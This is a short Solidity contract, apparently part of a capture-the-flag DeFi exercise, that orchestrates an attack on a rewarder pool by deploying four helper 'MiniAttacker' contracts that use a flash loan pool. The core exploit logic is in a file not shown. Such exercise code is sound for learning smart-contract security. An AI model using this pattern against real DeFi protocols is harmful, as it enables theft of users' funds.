// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
import "./MiniAttacker.sol";

contract MainRewarderAttacker {
    TheRewarderPool rewarderPool;
    FlashLoanerPool flashLoanerPool;
    address owner;

    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        address _owner
    ) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        owner = _owner;
    }

    function attack() external {
        for (uint256 i = 0; i < 4; i++) {
            MiniAttacker mini = new MiniAttacker(
                address(flashLoanerPool),
                address(rewarderPool),
                owner
            );
            mini.attack();
        }
    }
}
